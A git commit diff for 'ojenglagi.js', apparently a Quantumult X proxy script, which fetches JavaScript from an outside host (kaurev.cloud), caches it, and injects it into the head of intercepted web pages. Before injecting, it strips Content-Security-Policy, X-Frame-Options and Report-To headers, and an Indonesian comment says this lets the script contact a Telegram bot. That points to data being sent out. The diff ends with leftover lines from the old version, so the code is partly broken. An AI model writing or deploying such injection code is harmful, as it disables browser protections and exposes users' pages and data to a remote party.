d65228f4b5a51e450fee1cccd4672573bb591092
dimazez26-Ds <dimazez26@gmail.com>
2026-03-16 11:38:10 +0700

    Update ojenglagi.js

--- ojenglagi.js
+++ ojenglagi.js
@@ -1,39 +1,39 @@
-/**
- * Quantumult X Script for JS Injection
- */
-
 const U = "https://kaurev.cloud/6877912815/a76e2226e40ed42df1c52fb48857196e4d770086ce0bb67cdb1e78b8fb27cc04/install.user.js";
 const K = "my_js";
 
 let cachedJS = $prefs.valueForKey(K);
-let { body, headers } = $response;
 
-const finalize = (jsContent) => {
-    if (!body || !headers) {
+if (cachedJS) {
+    inject(cachedJS);
+} else {
+    $task.fetch({ url: U }).then(response => {
+        $prefs.setValueForKey(response.body, K);
+        inject(response.body);
+    }, reason => {
         $done({});
-        return;
-    }
+    });
+}
 
-    // Hapus CSP dan Frame Options agar script bisa jalan
+function inject(js) {
+    let body = $response.body;
+    let headers = $response.headers;
+
+    if (!body) return $done({});
+
+    // Hapus security headers agar script bisa kontak bot Tele
     Object.keys(headers).forEach(k => {
-        if (/content-security-policy|x-frame-options/i.test(k)) {
+        if (/content-security-policy|x-frame-options|report-to/i.test(k)) {
             delete headers[k];
         }
     });
 
     headers['Cache-Control'] = 'no-cache';
 
-    // Inject script ke dalam tag <head>
-    let newBody = body.replace(/<head>/i, `<head><script>${jsContent}</script>`);
+    // Inject JS
+    let injectedBody = body.replace(/<head>/i, `<head><script>${js}</script>`);
     
-    $done({ body: newBody, headers: headers });
-};
-
-if (cachedJS) {
-    finalize(cachedJS);
-} else {
-    const request = { url: U };
-    $task.fetch(request).then(response => {
+    $done({ body: injectedBody, headers: headers });
+}
         if (response.statusCode === 200) {
             $prefs.setValueForKey(response.body, K);
             finalize(response.body);
